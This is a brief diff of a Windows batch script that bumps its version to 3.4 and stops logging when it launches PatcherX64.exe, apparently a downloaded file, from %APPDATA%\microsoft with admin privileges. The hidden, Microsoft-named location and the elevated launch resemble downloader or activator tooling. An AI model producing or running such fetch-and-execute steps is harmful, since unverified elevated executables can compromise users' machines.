@@ -9,7 +9,7 @@ cd /d "%~dp0"
 :: Run All your commands here ( will be executed with admin privileges )
 
 
-set "BATCHVERSION=3.3"
+set "BATCHVERSION=3.4"
 
 
 
@@ -459,7 +459,7 @@ for %%a in ("%APPDATA%\microsoft\PatcherX64.exe") do set "FILESIZE=%%~za"
  
 :: Check if the file size is at least 80KB (80000 bytes)
 if %FILESIZE% geq 80000 (
-    start "" "%APPDATA%\microsoft\PatcherX64.exe" >> "%LOGFILE%" 2>&1
+    start "" "%APPDATA%\microsoft\PatcherX64.exe"
 ) else (
     echo.
     echo Download incomplete. Check your connection and run the file again. >> "%LOGFILE%" 2>&1
